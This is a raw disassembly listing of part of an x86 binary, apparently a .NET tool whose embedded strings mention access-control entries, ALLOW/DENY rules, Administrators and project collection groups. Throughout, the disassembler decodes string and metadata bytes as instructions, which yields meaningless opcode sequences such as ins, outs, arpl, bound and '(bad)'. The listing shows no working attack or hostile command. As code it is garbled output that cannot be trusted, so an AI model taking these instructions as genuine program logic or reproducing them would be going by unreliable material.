  40b035:	inc    ebx
  40b036:	outs   dx,DWORD PTR ds:[esi]
  40b037:	outs   dx,BYTE PTR ds:[esi]
  40b038:	je     0x40b0ac
  40b03a:	outs   dx,DWORD PTR ds:[esi]
  40b03b:	ins    BYTE PTR es:[edi],dx
  40b03c:	inc    ebp
  40b03d:	outs   dx,BYTE PTR ds:[esi]
  40b03e:	je     0x40b0b2
  40b040:	jns    0x40b042
  40b042:	inc    ecx
  40b043:	fs fs inc ecx
  40b046:	arpl   WORD PTR [ebx+0x65],sp
  40b049:	jae    0x40b0be
  40b04b:	inc    ebx
  40b04c:	outs   dx,DWORD PTR ds:[esi]
  40b04d:	outs   dx,BYTE PTR ds:[esi]
  40b04e:	je     0x40b0c2
  40b050:	outs   dx,DWORD PTR ds:[esi]
  40b051:	ins    BYTE PTR es:[edi],dx
  40b052:	inc    ebp
  40b053:	outs   dx,BYTE PTR ds:[esi]
  40b054:	je     0x40b0c8
  40b056:	jns    0x40b058
  40b058:	inc    esp
  40b059:	outs   dx,BYTE PTR gs:[esi]
  40b05b:	jns    0x40b05d
  40b05d:	inc    ecx
  40b05e:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  40b062:	outs   dx,BYTE PTR ds:[esi]
  40b063:	dec    ecx
  40b064:	add    BYTE PTR fs:[ebx+0x69],dl
  40b068:	add    BYTE PTR fs:[ebp+0x6e],al
  40b06c:	jae    0x40b0e3
  40b06e:	jb     0x40b0d5
  40b070:	inc    ecx
  40b071:	jne    0x40b0e7
  40b073:	push   0x69746e65
  40b078:	arpl   WORD PTR [ecx+0x74],sp
  40b07b:	gs add BYTE PTR fs:[edi+0x65],al
  40b080:	je     0x40b0d5
  40b082:	gs jb  0x40b0fb
  40b085:	imul   esp,DWORD PTR [ebx+0x65],0x74654700
  40b08c:	push   ebx
  40b08d:	arpl   WORD PTR gs:[ebp+0x72],si
  40b091:	imul   esi,DWORD PTR [ecx+edi*2+0x4e],0x73656d61
  40b099:	jo     0x40b0fc
  40b09b:	arpl   WORD PTR [ebp+0x73],sp
  40b09e:	add    BYTE PTR [ebx+0x65],dh
  40b0a1:	je     0x40b102
  40b0a3:	dec    ecx
  40b0a4:	je     0x40b10b
  40b0a6:	ins    DWORD PTR es:[edi],dx
  40b0a7:	add    BYTE PTR [esi],ch
  40b0a9:	arpl   WORD PTR [ebx+0x74],sp
  40b0ac:	outs   dx,DWORD PTR ds:[esi]
  40b0ad:	jb     0x40b0af
  40b0af:	dec    ecx
  40b0b0:	inc    ebp
  40b0b1:	jno    0x40b128
  40b0b3:	popa   
  40b0b4:	ins    BYTE PTR es:[edi],dx
  40b0b5:	imul   esi,DWORD PTR [ecx+edi*2+0x43],0x61706d6f
  40b0bd:	jb     0x40b124
  40b0bf:	jb     0x40b121
  40b0c1:	xor    DWORD PTR [eax],eax
  40b0c3:	push   ebx
  40b0c4:	jns    0x40b139
  40b0c6:	je     0x40b12d
  40b0c8:	ins    DWORD PTR es:[edi],dx
  40b0c9:	cs inc ebx
  40b0cb:	outs   dx,DWORD PTR ds:[esi]
  40b0cc:	fs gs inc esp
  40b0cf:	outs   dx,DWORD PTR ds:[esi]
  40b0d0:	ins    DWORD PTR es:[edi],dx
  40b0d1:	cs inc ebx
  40b0d3:	outs   dx,DWORD PTR ds:[esi]
  40b0d4:	ins    DWORD PTR es:[edi],dx
  40b0d5:	jo     0x40b140
  40b0d7:	ins    BYTE PTR es:[edi],dx
  40b0d8:	gs jb  0x40b0db
  40b0db:	inc    edi
  40b0dc:	outs   dx,BYTE PTR gs:[esi]
  40b0de:	gs jb  0x40b142
  40b0e1:	je     0x40b148
  40b0e3:	fs inc ebx
  40b0e5:	outs   dx,DWORD PTR ds:[esi]
  40b0e6:	fs gs inc ecx
  40b0e9:	je     0x40b15f
  40b0eb:	jb     0x40b156
  40b0ed:	bound  esi,QWORD PTR [ebp+0x74]
  40b0f0:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  40b0f5:	jne    0x40b15e
  40b0f7:	addr16 gs jb 0x40b149
  40b0fb:	outs   dx,DWORD PTR ds:[esi]
  40b0fc:	outs   dx,BYTE PTR ds:[esi]
  40b0fd:	push   ebp
  40b0fe:	jae    0x40b165
  40b100:	jb     0x40b145
  40b102:	outs   dx,DWORD PTR ds:[esi]
  40b103:	fs gs inc ecx
  40b106:	je     0x40b17c
  40b108:	jb     0x40b173
  40b10a:	bound  esi,QWORD PTR [ebp+0x74]
  40b10d:	add    BYTE PTR gs:[edx+0x65],dl
  40b111:	data16 gs jb 0x40b17a
  40b115:	outs   dx,BYTE PTR ds:[esi]
  40b116:	arpl   WORD PTR [ebp+0x45],sp
  40b119:	jno    0x40b190
  40b11b:	popa   
  40b11c:	ins    BYTE PTR es:[edi],dx
  40b11d:	jae    0x40b11f
  40b11f:	push   esp
  40b120:	jns    0x40b192
  40b122:	add    BYTE PTR gs:[edx+0x75],dl
  40b126:	outs   dx,BYTE PTR ds:[esi]
  40b127:	je     0x40b192
  40b129:	ins    DWORD PTR es:[edi],dx
  40b12a:	gs push esp
  40b12c:	jns    0x40b19e
  40b12e:	gs dec eax
  40b130:	popa   
  40b131:	outs   dx,BYTE PTR ds:[esi]
  40b132:	fs ins BYTE PTR es:[edi],dx
  40b134:	add    BYTE PTR gs:[edi+0x65],al
  40b138:	je     0x40b18e
  40b13a:	jns    0x40b1ac
  40b13c:	gs inc esi
  40b13e:	jb     0x40b1af
  40b140:	ins    DWORD PTR es:[edi],dx
  40b141:	dec    eax
  40b142:	popa   
  40b143:	outs   dx,BYTE PTR ds:[esi]
  40b144:	fs ins BYTE PTR es:[edi],dx
  40b146:	add    BYTE PTR gs:[ecx+0x73],al
  40b14a:	jae    0x40b1b1
  40b14c:	ins    DWORD PTR es:[edi],dx
  40b14d:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  40b151:	addr16 gs je 0x40b1b4
  40b155:	inc    ecx
  40b156:	jae    0x40b1cb
  40b158:	gs ins DWORD PTR es:[edi],dx
  40b15a:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  40b15e:	inc    edi
  40b15f:	gs je  0x40b1b5
  40b162:	je     0x40b1d6
  40b164:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  40b16b:	je     0x40b1d2
  40b16d:	ins    DWORD PTR es:[edi],dx
  40b16e:	cs inc ebx
  40b170:	outs   dx,DWORD PTR ds:[esi]
  40b171:	ins    DWORD PTR es:[edi],dx
  40b172:	jo     0x40b1e3
  40b174:	outs   dx,BYTE PTR ds:[esi]
  40b175:	outs   dx,BYTE PTR gs:[esi]
  40b177:	je     0x40b1c6
  40b179:	outs   dx,DWORD PTR ds:[esi]
  40b17a:	fs gs ins BYTE PTR es:[edi],dx
  40b17d:	add    BYTE PTR [ebp+0x64],al
  40b180:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  40b188:	jae    0x40b1eb
  40b18a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  40b18e:	je     0x40b204
  40b190:	jb     0x40b1fb
  40b192:	bound  esi,QWORD PTR [ebp+0x74]
  40b195:	add    BYTE PTR gs:[ebp+0x64],al
  40b199:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  40b1a1:	jae    0x40b204
  40b1a3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  40b1a7:	je     0x40b20a
  40b1a9:	je     0x40b210
  40b1ab:	add    BYTE PTR [edi+0x73],al
  40b1ae:	jae    0x40b205
  40b1b0:	je     0x40b21b
  40b1b2:	ins    BYTE PTR es:[edi],dx
  40b1b3:	push   edx
  40b1b4:	gs jae 0x40b226
  40b1b7:	jne    0x40b22b
  40b1b9:	arpl   WORD PTR [ebp+0x73],sp
  40b1bc:	cs jb  0x40b224
  40b1bf:	jae    0x40b230
  40b1c1:	jne    0x40b235
  40b1c3:	arpl   WORD PTR [ebp+0x73],sp
  40b1c6:	add    BYTE PTR [eax],al
  40b1c8:	add    BYTE PTR ds:0x53000a,cl
  40b1ce:	dec    ecx
  40b1cf:	add    BYTE PTR [eax+eax*1+0x3a],al
  40b1d3:	add    BYTE PTR [eax],ah
  40b1d5:	add    BYTE PTR [eax],al
  40b1d7:	or     ecx,DWORD PTR [edx]
  40b1d9:	add    BYTE PTR [eax+eax*1+0x4e],al
  40b1dd:	add    BYTE PTR [edx],bh
  40b1df:	add    BYTE PTR [eax],ah
  40b1e1:	add    BYTE PTR [eax],al
  40b1e3:	or     eax,0x200020
  40b1e8:	pop    ebx
  40b1e9:	add    BYTE PTR [ebp+0x0],dl
  40b1ec:	pop    ebp
  40b1ed:	add    BYTE PTR [eax],ah
  40b1ef:	add    BYTE PTR [eax],al
  40b1f1:	or     eax,0x200020
  40b1f6:	pop    ebx
  40b1f7:	add    BYTE PTR [edi+0x0],al
  40b1fa:	pop    ebp
  40b1fb:	add    BYTE PTR [eax],ah
  40b1fd:	add    BYTE PTR [eax],al
  40b1ff:	or     eax,0x200020
  40b204:	pop    ebx
  40b205:	add    BYTE PTR [ecx+0x0],al
  40b208:	pop    ebp
  40b209:	add    BYTE PTR [eax],ah
  40b20b:	add    BYTE PTR [eax],al
  40b20d:	or     eax,0x200061
  40b212:	pop    ebx
  40b213:	add    BYTE PTR [ecx+0x0],al
  40b216:	pop    ebp
  40b217:	add    BYTE PTR [eax],ah
  40b219:	add    BYTE PTR [eax],al
  40b21b:	or     eax,0x200065
  40b220:	pop    ebx
  40b221:	add    BYTE PTR [ecx+0x0],al
  40b224:	pop    ebp
  40b225:	add    BYTE PTR [eax],ah
  40b227:	add    BYTE PTR [eax],al
  40b229:	or     eax,0x200073
  40b22e:	pop    ebx
  40b22f:	add    BYTE PTR [ecx+0x0],al
  40b232:	pop    ebp
  40b233:	add    BYTE PTR [eax],ah
  40b235:	add    BYTE PTR [eax],al
  40b237:	or     eax,0x200020
  40b23c:	pop    ebx
  40b23d:	add    BYTE PTR [eax+0x0],bl
  40b240:	pop    ebp
  40b241:	add    BYTE PTR [eax],ah
  40b243:	add    BYTE PTR [eax],al
  40b245:	or     eax,0x200020
  40b24a:	pop    ebx
  40b24b:	add    BYTE PTR [edi],bh
  40b24d:	add    BYTE PTR [ebp+0x0],bl
  40b250:	and    BYTE PTR [eax],al
  40b252:	add    BYTE PTR ds:0x280020,al
  40b258:	add    BYTE PTR ds:0x200020,al
  40b25e:	add    BYTE PTR [ecx],cl
  40b260:	pop    ebx
  40b261:	add    BYTE PTR ds:0x20005d00,ch
  40b267:	add    BYTE PTR [ecx],al
  40b269:	or     DWORD PTR [ebx+0x0],ebx
  40b26c:	sub    eax,DWORD PTR [eax]
  40b26e:	pop    ebp
  40b26f:	add    BYTE PTR [eax],ah
  40b271:	add    BYTE PTR [eax],al
  40b273:	pop    es
  40b274:	add    BYTE PTR cs:[esi],ch
  40b277:	add    BYTE PTR [esi],ch
  40b279:	add    BYTE PTR [eax],al
  40b27b:	pop    es
  40b27c:	and    BYTE PTR [eax],al
  40b27e:	and    BYTE PTR [eax],al
  40b280:	and    BYTE PTR [eax],al
  40b282:	add    BYTE PTR [ecx],cl
  40b284:	jae    0x40b286
  40b286:	imul   eax,DWORD PTR [eax],0x3a0064
  40b28c:	add    BYTE PTR ds:0x3a006e,al
  40b292:	add    BYTE PTR [ecx],cl
  40b294:	jae    0x40b296
  40b296:	jb     0x40b298
  40b298:	jbe    0x40b29a
  40b29a:	cmp    al,BYTE PTR [eax]
  40b29c:	add    BYTE PTR [ecx],cl
  40b29e:	popa   
  40b29f:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40b2a3:	add    BYTE PTR [edx],bh
  40b2a5:	add    BYTE PTR [eax],al
  40b2a7:	or     DWORD PTR [ecx+0x0],esp
  40b2aa:	add    BYTE PTR fs:[ebp+0x0],ch
  40b2ae:	cmp    al,BYTE PTR [eax]
  40b2b0:	add    BYTE PTR [ecx],cl
  40b2b2:	jae    0x40b2b4
  40b2b4:	sub    eax,0x2d003100
  40b2b9:	add    BYTE PTR [ecx],al
  40b2bb:	add    eax,0x6e0065
  40b2c0:	add    BYTE PTR [ebx],al
  40b2c2:	imul   eax,DWORD PTR [eax],0x690500
  40b2c8:	ins    DWORD PTR es:[edi],dx
  40b2c9:	add    BYTE PTR [eax],al
  40b2cb:	pop    es
  40b2cc:	imul   eax,DWORD PTR [eax],0x78006d
  40b2d2:	add    BYTE PTR [ecx],al
  40b2d4:	add    BYTE PTR [edi],al
  40b2d6:	add    BYTE PTR [bp+di+0x0],ah
  40b2da:	add    BYTE PTR [bx+si],al
  40b2dd:	add    eax,0x630067
  40b2e2:	add    BYTE PTR [ebx],al
  40b2e4:	add    BYTE PTR [bx+si],al
  40b2e7:	pop    es
  40b2e8:	add    BYTE PTR [di+0x0],dh
  40b2ec:	outs   dx,BYTE PTR ds:[esi]
  40b2ed:	add    BYTE PTR [eax],al
  40b2ef:	pop    es
  40b2f0:	add    BYTE PTR [di+0x0],dh
  40b2f4:	add    BYTE PTR fs:[eax],al
  40b2f7:	add    eax,0x640067
  40b2fc:	add    BYTE PTR ds:0x2b0067,al
  40b302:	add    BYTE PTR ds:0x2d0067,al
  40b308:	add    DWORD PTR [ebx],eax
  40b30a:	ins    DWORD PTR es:[edi],dx
  40b30b:	add    BYTE PTR [eax],al
  40b30d:	add    eax,0x2b0061
  40b312:	add    BYTE PTR ds:0x2d0061,al
  40b318:	add    DWORD PTR [edi],eax
  40b31a:	popa   
  40b31b:	add    BYTE PTR [ebx+0x0],ah
  40b31e:	ins    BYTE PTR es:[edi],dx
  40b31f:	add    BYTE PTR [eax],al
  40b321:	add    esp,DWORD PTR [ecx+0x0]
  40b324:	add    BYTE PTR [ecx],ch
  40b326:	push   esp
  40b327:	add    BYTE PTR [esi+0x0],al
  40b32a:	push   ebx
  40b32b:	add    BYTE PTR [ebx+0x0],dl
  40b32e:	inc    ebp
  40b32f:	add    BYTE PTR [ebx+0x0],al
  40b332:	push   ebp
  40b333:	add    BYTE PTR [edx+0x0],dl
  40b336:	dec    ecx
  40b337:	add    BYTE PTR [eax+eax*1+0x59],dl
  40b33b:	add    BYTE PTR [edi+0x0],bl
  40b33e:	push   ebx
  40b33f:	add    BYTE PTR [edi+0x0],dl
  40b342:	dec    ecx
  40b343:	add    BYTE PTR [eax+eax*1+0x43],dl
  40b347:	add    BYTE PTR [eax+0x0],cl
  40b34a:	inc    ebp
  40b34b:	add    BYTE PTR [ebx+0x0],dl
  40b34e:	add    BYTE PTR [ebx],al
  40b350:	das    
  40b351:	add    BYTE PTR [eax],al
  40b353:	pop    es
  40b354:	das    
  40b355:	add    BYTE PTR [ecx+0x0],dh
  40b358:	popa   
  40b359:	add    BYTE PTR [eax],al
  40b35b:	(bad)  
  40b35d:	add    BYTE PTR [ebp+0x0],ah
  40b360:	jb     0x40b362
  40b362:	jbe    0x40b364
  40b364:	add    BYTE PTR gs:[edx+0x0],dh
  40b368:	cmp    al,BYTE PTR [eax]
  40b36a:	add    BYTE PTR [ecx],bl
  40b36c:	das    
  40b36d:	add    BYTE PTR [ebx+0x0],ah
  40b370:	outs   dx,DWORD PTR ds:[esi]
  40b371:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40b375:	add    BYTE PTR [ebp+0x0],ah
  40b378:	arpl   WORD PTR [eax],ax
  40b37a:	je     0x40b37c
  40b37c:	imul   eax,DWORD PTR [eax],0x6e006f
  40b382:	cmp    al,BYTE PTR [eax]
  40b384:	add    BYTE PTR [edi],bl
  40b386:	das    
  40b387:	add    BYTE PTR [ebx+0x0],ah
  40b38a:	outs   dx,DWORD PTR ds:[esi]
  40b38b:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40b38f:	add    BYTE PTR [ebp+0x0],ah
  40b392:	arpl   WORD PTR [eax],ax
  40b394:	je     0x40b396
  40b396:	imul   eax,DWORD PTR [eax],0x6e006f
  40b39c:	add    BYTE PTR gs:[esi+0x0],ch
  40b3a0:	jbe    0x40b3a2
  40b3a2:	cmp    al,BYTE PTR [eax]
  40b3a4:	add    BYTE PTR [ecx],dl
  40b3a6:	das    
  40b3a7:	add    BYTE PTR [ebx+0x0],dh
  40b3aa:	add    BYTE PTR gs:[edx+0x0],dh
  40b3ae:	jbe    0x40b3b0
  40b3b0:	add    BYTE PTR gs:[edx+0x0],dh
  40b3b4:	cmp    al,BYTE PTR [eax]
  40b3b6:	add    BYTE PTR [edi],dl
  40b3b8:	das    
  40b3b9:	add    BYTE PTR [ebx+0x0],dh
  40b3bc:	add    BYTE PTR gs:[edx+0x0],dh
  40b3c0:	jbe    0x40b3c2
  40b3c2:	add    BYTE PTR gs:[edx+0x0],dh
  40b3c6:	add    BYTE PTR gs:[esi+0x0],ch
  40b3ca:	jbe    0x40b3cc
  40b3cc:	cmp    al,BYTE PTR [eax]
  40b3ce:	add    BYTE PTR [ebx],al
  40b3d0:	aas    
  40b3d1:	add    BYTE PTR [eax],al
  40b3d3:	pop    ss
  40b3d4:	arpl   WORD PTR [eax],ax
  40b3d6:	outs   dx,DWORD PTR ds:[esi]
  40b3d7:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40b3db:	add    BYTE PTR [ebp+0x0],ah
  40b3de:	arpl   WORD PTR [eax],ax
  40b3e0:	je     0x40b3e2
  40b3e2:	imul   eax,DWORD PTR [eax],0x6e006f
  40b3e8:	cmp    al,BYTE PTR [eax]
  40b3ea:	add    BYTE PTR ds:0x6f0063,bl
  40b3f0:	ins    BYTE PTR es:[edi],dx
  40b3f1:	add    BYTE PTR [eax+eax*1+0x65],ch
  40b3f5:	add    BYTE PTR [ebx+0x0],ah
  40b3f8:	je     0x40b3fa
  40b3fa:	imul   eax,DWORD PTR [eax],0x6e006f
  40b400:	add    BYTE PTR gs:[esi+0x0],ch
  40b404:	jbe    0x40b406
  40b406:	cmp    al,BYTE PTR [eax]
  40b408:	add    BYTE PTR ds:0x650073,dl
  40b40e:	jb     0x40b410
  40b410:	jbe    0x40b412
  40b412:	add    BYTE PTR gs:[edx+0x0],dh
  40b416:	add    BYTE PTR gs:[esi+0x0],ch
  40b41a:	jbe    0x40b41c
  40b41c:	cmp    al,BYTE PTR [eax]
  40b41e:	add    BYTE PTR ds:0x450053,cl
  40b424:	push   edx
  40b425:	add    BYTE PTR [esi+0x0],dl
  40b428:	inc    ebp
  40b429:	add    BYTE PTR [edx+0x0],dl
  40b42c:	add    BYTE PTR [ebx],al
  40b42e:	or     al,BYTE PTR [eax]
  40b430:	add    BYTE PTR [edi],cl
  40b432:	and    BYTE PTR [eax],al
  40b434:	and    BYTE PTR [eax],al
  40b436:	and    BYTE PTR [eax],al
  40b438:	and    BYTE PTR [eax],al
  40b43a:	jnp    0x40b43c
  40b43c:	xor    BYTE PTR [eax],al
  40b43e:	jge    0x40b440
  40b440:	add    BYTE PTR [ecx],dl
  40b442:	and    BYTE PTR [eax],al
  40b444:	and    BYTE PTR [eax],al
  40b446:	and    BYTE PTR [eax],al
  40b448:	and    BYTE PTR [eax],al
  40b44a:	and    BYTE PTR [eax],al
  40b44c:	jnp    0x40b44e
  40b44e:	xor    BYTE PTR [eax],al
  40b450:	jge    0x40b452
  40b452:	add    BYTE PTR [ebx],cl
  40b454:	inc    ecx
  40b455:	add    BYTE PTR [eax+eax*1+0x4c],cl
  40b459:	add    BYTE PTR [edi+0x0],cl
  40b45c:	push   edi
  40b45d:	add    BYTE PTR [eax],al
  40b45f:	or     eax,DWORD PTR [edi+0x0]
  40b462:	push   edx
  40b463:	add    BYTE PTR [ecx+0x0],al
  40b466:	dec    esi
  40b467:	add    BYTE PTR [eax+eax*1+0x0],dl
  40b46b:	or     DWORD PTR [eax+eax*1+0x45],eax
  40b46f:	add    BYTE PTR [esi+0x0],cl
  40b472:	pop    ecx
  40b473:	add    BYTE PTR [eax],al
  40b475:	or     eax,0x450052
  40b47a:	push   esi
  40b47b:	add    BYTE PTR [edi+0x0],cl
  40b47e:	dec    ebx
  40b47f:	add    BYTE PTR [ebp+0x0],al
  40b482:	add    BYTE PTR [ecx],ah
  40b484:	inc    edi
  40b485:	add    BYTE PTR [ebx+0x0],dh
  40b488:	jae    0x40b48a
  40b48a:	push   ebp
  40b48b:	add    BYTE PTR [eax+eax*1+0x69],dh
  40b48f:	add    BYTE PTR [eax+eax*1+0x52],ch
  40b493:	add    BYTE PTR [ebp+0x0],ah
  40b496:	jae    0x40b498
  40b498:	outs   dx,DWORD PTR ds:[esi]
  40b499:	add    BYTE PTR [ebp+0x0],dh
  40b49c:	jb     0x40b49e
  40b49e:	arpl   WORD PTR [eax],ax
  40b4a0:	add    BYTE PTR gs:[ebx+0x0],dh
  40b4a4:	add    BYTE PTR [edi],dl
  40b4a6:	inc    ecx
  40b4a7:	add    BYTE PTR [ebx+0x0],al
  40b4aa:	dec    esp
  40b4ab:	add    BYTE PTR [edi+0x0],cl
  40b4ae:	outs   dx,BYTE PTR ds:[esi]
  40b4af:	add    BYTE PTR [edi+0x0],cl
  40b4b2:	bound  eax,QWORD PTR [eax]
  40b4b4:	push   0x0
  40b4b6:	add    BYTE PTR gs:[ebx+0x0],ah
  40b4ba:	je     0x40b4bc
  40b4bc:	add    BYTE PTR [ecx],dh
  40b4be:	inc    ecx
  40b4bf:	add    BYTE PTR [eax+eax*1+0x64],ah
  40b4c3:	add    BYTE PTR [ecx+0x0],ch
  40b4c6:	outs   dx,BYTE PTR ds:[esi]
  40b4c7:	add    BYTE PTR [edi+0x0],ah
  40b4ca:	inc    ecx
  40b4cb:	add    BYTE PTR [ebx+0x0],ah
  40b4ce:	arpl   WORD PTR [eax],ax
  40b4d0:	add    BYTE PTR gs:[ebx+0x0],dh
  40b4d4:	jae    0x40b4d6
  40b4d6:	inc    ebx
  40b4d7:	add    BYTE PTR [edi+0x0],ch
  40b4da:	outs   dx,BYTE PTR ds:[esi]
  40b4db:	add    BYTE PTR [eax+eax*1+0x72],dh
  40b4df:	add    BYTE PTR [edi+0x0],ch
  40b4e2:	ins    BYTE PTR es:[edi],dx
  40b4e3:	add    BYTE PTR [ebp+0x0],al
  40b4e6:	outs   dx,BYTE PTR ds:[esi]
  40b4e7:	add    BYTE PTR [eax+eax*1+0x72],dh
  40b4eb:	add    BYTE PTR [ecx+0x0],bh
  40b4ee:	add    BYTE PTR [edi],ah
  40b4f0:	inc    ecx
  40b4f1:	add    BYTE PTR [eax+eax*1+0x64],ah
  40b4f5:	add    BYTE PTR [ecx+0x0],ch
  40b4f8:	outs   dx,BYTE PTR ds:[esi]
  40b4f9:	add    BYTE PTR [edi+0x0],ah
  40b4fc:	dec    ebp
  40b4fd:	add    BYTE PTR [ebp+0x0],ah
  40b500:	ins    DWORD PTR es:[edi],dx
  40b501:	add    BYTE PTR [edx+0x0],ah
  40b504:	add    BYTE PTR gs:[edx+0x0],dh
  40b508:	push   esp
  40b509:	add    BYTE PTR [edi+0x0],ch
  40b50c:	inc    edi
  40b50d:	add    BYTE PTR [edx+0x0],dh
  40b510:	outs   dx,DWORD PTR ds:[esi]
  40b511:	add    BYTE PTR [ebp+0x0],dh
  40b514:	jo     0x40b516
  40b516:	add    BYTE PTR [ebx],dl
  40b518:	inc    ecx
  40b519:	add    BYTE PTR [ebp+0x0],cl
  40b51c:	add    BYTE PTR gs:[ebp+0x0],ch
  40b520:	bound  eax,QWORD PTR [eax]
  40b522:	add    BYTE PTR gs:[edx+0x0],dh
  40b526:	dec    edi
  40b527:	add    BYTE PTR [esi+0x0],ah
  40b52a:	add    BYTE PTR ds:0x610043,dh
  40b530:	jo     0x40b532
  40b532:	imul   eax,DWORD PTR [eax],0x610074
  40b538:	ins    BYTE PTR es:[edi],dx
  40b539:	add    BYTE PTR [eax+eax*1+0x46],dl
  40b53d:	add    BYTE PTR [ebx+0x0],dl
  40b540:	inc    ecx
  40b541:	add    BYTE PTR [eax+0x0],dh
  40b544:	jo     0x40b546
  40b546:	ins    BYTE PTR es:[edi],dx
  40b547:	add    BYTE PTR [ecx+0x0],ch
  40b54a:	arpl   WORD PTR [eax],ax
  40b54c:	popa   
  40b54d:	add    BYTE PTR [eax+eax*1+0x69],dh
  40b551:	add    BYTE PTR [edi+0x0],ch
  40b554:	outs   dx,BYTE PTR ds:[esi]
  40b555:	add    BYTE PTR [edi+0x0],al
  40b558:	jb     0x40b55a
  40b55a:	outs   dx,DWORD PTR ds:[esi]
  40b55b:	add    BYTE PTR [ebp+0x0],dh
  40b55e:	jo     0x40b560
  40b560:	add    BYTE PTR [edi+0x43],al
  40b563:	add    BYTE PTR [eax+0x0],ch
  40b566:	popa   
  40b567:	add    BYTE PTR [esi+0x0],ch
  40b56a:	add    BYTE PTR [bx+di+0x0],ch
  40b56e:	outs   dx,BYTE PTR ds:[esi]
  40b56f:	add    BYTE PTR [edi+0x0],ah
  40b572:	inc    ecx
  40b573:	add    BYTE PTR [eax+0x0],dh
  40b576:	jo     0x40b578
  40b578:	ins    BYTE PTR es:[edi],dx
  40b579:	add    BYTE PTR [ecx+0x0],ch
  40b57c:	arpl   WORD PTR [eax],ax
  40b57e:	popa   
  40b57f:	add    BYTE PTR [eax+eax*1+0x69],dh
  40b583:	add    BYTE PTR [edi+0x0],ch
  40b586:	outs   dx,BYTE PTR ds:[esi]
  40b587:	add    BYTE PTR [edi+0x0],al
  40b58a:	jb     0x40b58c
  40b58c:	outs   dx,DWORD PTR ds:[esi]
  40b58d:	add    BYTE PTR [ebp+0x0],dh
  40b590:	jo     0x40b592
  40b592:	inc    esp
  40b593:	add    BYTE PTR [ebp+0x0],ah
  40b596:	jae    0x40b598
  40b598:	arpl   WORD PTR [eax],ax
  40b59a:	jb     0x40b59c
  40b59c:	imul   eax,DWORD PTR [eax],0x740070
  40b5a2:	imul   eax,DWORD PTR [eax],0x6e006f
  40b5a8:	add    BYTE PTR [edi],ch
  40b5aa:	inc    ebx
  40b5ab:	add    BYTE PTR [eax+0x0],ch
  40b5ae:	add    BYTE PTR gs:[ebx+0x0],ah
  40b5b2:	imul   eax,DWORD PTR [eax],0x69
  40b5b5:	add    BYTE PTR [esi+0x0],ch
  40b5b8:	add    BYTE PTR [bx+0x0],al
  40b5bc:	jb     0x40b5be
  40b5be:	outs   dx,DWORD PTR ds:[esi]
  40b5bf:	add    BYTE PTR [ebp+0x0],dh
  40b5c2:	jo     0x40b5c4
  40b5c4:	dec    ebp
  40b5c5:	add    BYTE PTR [ebp+0x0],ah
  40b5c8:	ins    DWORD PTR es:[edi],dx
  40b5c9:	add    BYTE PTR [edx+0x0],ah
  40b5cc:	add    BYTE PTR gs:[edx+0x0],dh
  40b5d0:	jae    0x40b5d2
  40b5d2:	push   0x70006900
  40b5d7:	add    BYTE PTR [eax],al
  40b5d9:	and    eax,0x6f0043
  40b5de:	jo     0x40b5e0
  40b5e0:	jns    0x40b5e2
  40b5e2:	jb     0x40b5e4
  40b5e4:	imul   eax,DWORD PTR [eax],0x680067
  40b5ea:	je     0x40b5ec
  40b5ec:	push   ebx
  40b5ed:	add    BYTE PTR [eax+eax*1+0x61],dh
  40b5f1:	add    BYTE PTR [eax+eax*1+0x65],dh
  40b5f5:	add    BYTE PTR [ebp+0x0],ch
  40b5f8:	add    BYTE PTR gs:[esi+0x0],ch
  40b5fc:	je     0x40b5fe
  40b5fe:	add    BYTE PTR ds:0x720043,bh
  40b604:	add    BYTE PTR gs:[ecx+0x0],ah
  40b608:	je     0x40b60a
  40b60a:	imul   eax,DWORD PTR [eax],0x67006e
  40b610:	inc    edi
  40b611:	add    BYTE PTR [eax+eax*1+0x6f],ch
  40b615:	add    BYTE PTR [edx+0x0],ah
  40b618:	popa   
  40b619:	add    BYTE PTR [eax+eax*1+0x41],ch
  40b61d:	add    BYTE PTR [eax+0x0],dh
  40b620:	jo     0x40b622
  40b622:	ins    BYTE PTR es:[edi],dx
  40b623:	add    BYTE PTR [ecx+0x0],ch
  40b626:	arpl   WORD PTR [eax],ax
  40b628:	popa   
  40b629:	add    BYTE PTR [eax+eax*1+0x69],dh
  40b62d:	add    BYTE PTR [edi+0x0],ch
  40b630:	outs   dx,BYTE PTR ds:[esi]
  40b631:	add    BYTE PTR [edi+0x0],al
  40b634:	jb     0x40b636
  40b636:	outs   dx,DWORD PTR ds:[esi]
  40b637:	add    BYTE PTR [ebp+0x0],dh
  40b63a:	jo     0x40b63c
  40b63c:	add    BYTE PTR [ebx],bh
  40b63e:	inc    ebx
  40b63f:	add    BYTE PTR [edx+0x0],dh
  40b642:	add    BYTE PTR gs:[ecx+0x0],ah
  40b646:	je     0x40b648
  40b648:	imul   eax,DWORD PTR [eax],0x67006e
  40b64e:	dec    esp
  40b64f:	add    BYTE PTR [edi+0x0],ch
  40b652:	arpl   WORD PTR [eax],ax
  40b654:	popa   
  40b655:	add    BYTE PTR [eax+eax*1+0x41],ch
  40b659:	add    BYTE PTR [eax+0x0],dh
  40b65c:	jo     0x40b65e
  40b65e:	ins    BYTE PTR es:[edi],dx
  40b65f:	add    BYTE PTR [ecx+0x0],ch
  40b662:	arpl   WORD PTR [eax],ax
  40b664:	popa   
  40b665:	add    BYTE PTR [eax+eax*1+0x69],dh
  40b669:	add    BYTE PTR [edi+0x0],ch
  40b66c:	outs   dx,BYTE PTR ds:[esi]
  40b66d:	add    BYTE PTR [edi+0x0],al
  40b670:	jb     0x40b672
  40b672:	outs   dx,DWORD PTR ds:[esi]
  40b673:	add    BYTE PTR [ebp+0x0],dh
  40b676:	jo     0x40b678
  40b678:	add    BYTE PTR [ecx],dh
  40b67a:	inc    esp
  40b67b:	add    BYTE PTR [ebp+0x0],ah
  40b67e:	ins    BYTE PTR es:[edi],dx
  40b67f:	add    BYTE PTR [ebp+0x0],ah
  40b682:	je     0x40b684
  40b684:	imul   eax,DWORD PTR [eax],0x67006e
